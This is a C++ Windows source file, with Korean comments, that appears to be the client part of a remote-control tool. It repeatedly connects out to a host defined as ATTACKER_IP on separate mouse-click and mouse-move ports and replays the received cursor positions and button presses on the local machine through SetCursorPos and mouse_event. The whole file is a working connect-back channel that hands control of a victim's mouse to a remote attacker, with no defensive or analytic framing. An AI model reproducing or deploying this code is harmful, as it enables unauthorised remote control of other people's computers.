#include"main.h"



void Mouse_Move(MOUSE_INFO mouse_process)//recv udp에서 돌림
{
	SetCursorPos(mouse_process.xy.x, mouse_process.xy.y);

}

void Mouse_Click(MOUSE_INFO mouse_process)//recv tcp에서 돌림
{
	

	if (mouse_process.left_click_check == TRUE && mouse_process.right_click_check == FALSE) {		//왼쪽 마우스 눌림
		mouse_event(MOUSEEVENTF_LEFTDOWN, mouse_process.xy.x, mouse_process.xy.y, NULL, NULL);
		//cout << mouse_process.left_click_check << endl;
		//cout << mouse_process.right_click_check << endl;
		cout << "왼쪽 눌림" << endl;
		
	}
	else if (mouse_process.left_click_check == FALSE && mouse_process.right_click_check == FALSE && mouse_process.flag==1)	//왼쪽 마우스 올림
	{
		mouse_event(MOUSEEVENTF_LEFTUP, mouse_process.xy.x, mouse_process.xy.y, NULL, NULL);
		//cout << mouse_process.left_click_check << endl;
		//cout << mouse_process.right_click_check << endl;
		cout << "왼쪽 안눌림" << endl;
	}
	else if (mouse_process.right_click_check == TRUE && mouse_process.left_click_check == FALSE)	//오른쪽 마우스 내림
	{
		mouse_event(MOUSEEVENTF_RIGHTDOWN, mouse_process.xy.x, mouse_process.xy.y, NULL, NULL);
		//cout << mouse_process.left_click_check << endl;
		//cout << mouse_process.right_click_check << endl;
		cout << "오른쪽 눌림" << endl;
		
	}
	else if (mouse_process.right_click_check == FALSE && mouse_process.left_click_check == FALSE && mouse_process.flag==2)	//오른쪽 마우스 올림
	{
		mouse_event(MOUSEEVENTF_RIGHTUP, mouse_process.xy.x, mouse_process.xy.y, NULL, NULL);
	//	cout << mouse_process.left_click_check << endl;
		//cout << mouse_process.right_click_check << endl;
		cout << "오른쪽 안눌림" << endl;
	}
	

}



void MouseRecvTcpSocket()						//마우스 클릭 받기
{
	
	//char* char_mouse_pro=nullptr;
	//char_mouse_pro = new char[sizeof(MOUSE_INFO)];
	MOUSE_INFO mi = { 0, };
	SOCKET ssock = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN saddr = { 0, };
	WSAEVENT sevent = WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(MOUSE_CLICK_PORT);

	/*while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{
		//cout << "connecting...." << endl;
		//Sleep(1000);
	}*/

	while (1) {
		
		if (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
		{
			if (WSAGetLastError() == WSAEISCONN)
				break;

			cout << "mouse click " << endl;

			Sleep(1000);

		}
															
	}

	while (1) {

		DWORD dwret = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		
		if (dwret == WAIT_FAILED) 
		{
			continue;
		}
		if (dwret == WAIT_OBJECT_0 + 1) 
		{
			break;
		}

		WSANETWORKEVENTS ne;
		WSAEnumNetworkEvents(ssock, sevent, &ne);

		if (ne.lNetworkEvents & FD_CONNECT)
		{

			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if (errcode != 0)
			{
				goto $connect;
			}

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_READ | FD_CLOSE);
			continue;
		}

		if (ne.lNetworkEvents & FD_READ)
		{
			int errcode = ne.iErrorCode[FD_READ_BIT];
			if (errcode != 0) 
			{
				goto $connect;
			}
			ZeroMemory(&mi, sizeof(mi));
			if (recv(ssock, (char*)&mi, sizeof(MOUSE_INFO), NULL) == SOCKET_ERROR)
				goto $connect;

			Mouse_Click(mi);
			continue;
		}

		if (ne.lNetworkEvents & FD_CLOSE) 
		{
		$connect:

			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);

			ssock = socket(AF_INET, SOCK_STREAM, 0);

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAEISCONN)
					break;

				cout << "mouse click..... " << endl;

				Sleep(1000);

			}
		}


		
	}
	

}

void RecvfromUdpSocket()			//마우스 움직임 받기
{

	MOUSE_INFO mouse_pro;
	char* char_mouse_pro=nullptr;
	char_mouse_pro = new char[sizeof(MOUSE_INFO)];
	SOCKET ssock;
	SOCKADDR_IN saddr = { 0, };
	
	WSAEVENT sevent = NULL;
	


	ZeroMemory(&saddr, sizeof(saddr));
	
	
	sevent = WSACreateEvent();
	
	ssock = socket(AF_INET, SOCK_STREAM, 0);

	WSAEventSelect(ssock, sevent, FD_CONNECT);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(MOUSE_MOVE_PORT);


	while (1) {
		
		if(connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
		{

			if (WSAGetLastError() == WSAEISCONN)
				break;

			cout << "mouse move..... " << endl;
			
		}
		
		Sleep(1000);
	}
	


	while (1) {
		DWORD dwret = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		if (dwret == WAIT_FAILED)
			continue;
		if (dwret == WAIT_OBJECT_0 + 1)
			break;

		WSANETWORKEVENTS ne;
		WSAEnumNetworkEvents(ssock, sevent, &ne);


		if (ne.lNetworkEvents & FD_CONNECT) 
		{
			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if (errcode != 0)
				goto $connect;

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_READ | FD_CLOSE);
			continue;
		}

		if (ne.lNetworkEvents & FD_READ) 
		{
			int errcode = ne.iErrorCode[FD_READ_BIT];
			if (errcode != 0)
				goto $connect;

			ZeroMemory(char_mouse_pro, sizeof(MOUSE_INFO));
			if (recv(ssock, char_mouse_pro, sizeof(MOUSE_INFO), NULL) == SOCKET_ERROR)
				goto $connect;
			Mouse_Move(*((LPMOUSE_INFO)char_mouse_pro));	//마우스 움직임
			continue;
		}

		if (ne.lNetworkEvents & FD_CLOSE) 
		{

		$connect:

			std::cout << "종료" << endl;

			if(ssock)
				closesocket(ssock);

			if (sevent)
				CloseHandle(sevent);

			

			ssock = socket(AF_INET, SOCK_STREAM, 0);


			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAEISCONN)
					break;

				cout << "mouse move..... " << endl;

				Sleep(1000);

			}
		}		
									
	}
}



